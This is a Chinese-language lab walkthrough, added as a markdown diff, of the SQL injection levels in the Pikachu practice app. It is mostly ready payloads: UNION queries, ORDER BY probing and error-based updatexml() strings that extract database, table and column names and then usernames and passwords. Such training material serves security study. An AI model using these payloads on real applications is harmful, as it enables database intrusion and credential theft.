@@ -1,0 +1,57 @@
+### 实操-Pikachu-SQL注入全类型
+
+第一关（数字型注入）
+
+不考虑闭合，直接拼接查询语句就可以。
+1 union select 1,database()
+
+第二关（字符型注入）
+
+这里'闭合前面的'id'，然后还是用union联合注入就可以查找出账户密码这些
+
+第三关（搜索型注入）
+
+这里主要是考虑参与联合查询的各个 SELECT 语句返回的列数要一致
+1' order by 3--       #返回查询列数为3，然后继续查询就可以
+
+第四关（XX型注入）
+
+这一关主要考的是闭合方式，根据测试闭合方式为1')
+
+1')闭合前面的('id')，然后继续用联合查询就可以
+
+第五关（insert/update注入）增、改注入
+
+这里需要用报错型注入，先登录页面后再修改位置注入，可以抓包重放器修改。
+
+爆库名，这里用and，条件为真才能报错,updatexml()函数中有三个参数，第二个参数XPath为更新节点。
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- 
+
+爆表名
+1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),0x7e),1)-- 
+
+1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),0x7e),1)-- 
+
+爆列名
+
+1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 12,1)),1)--            
+
+1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 13,1)),1)--          
+
+爆账户密码,因为长度限制，只能1个1个爆账户和密码
+
+1' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),1)-- 
+1' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)-- 
+
+第六关（delete注入）
+
+是数字型注入，可以直接在网页提交?id=
+1%20and%20updatexml(1,concat(0x7e,(database())),1)
+
+爆表名，然后剩下的类似操作就可以
+1%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27pikachu%27limit%200,1)),1)
+
+第七关（http header注入）
+
+这里要末尾要用or' 不能用--+， -- ，#注释 ，or' 中的最后一个单引号与原始 SQL 中 $username 后面的闭合单引号配对，形成 ''（空字符串）
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or'           #后续步骤就同上。
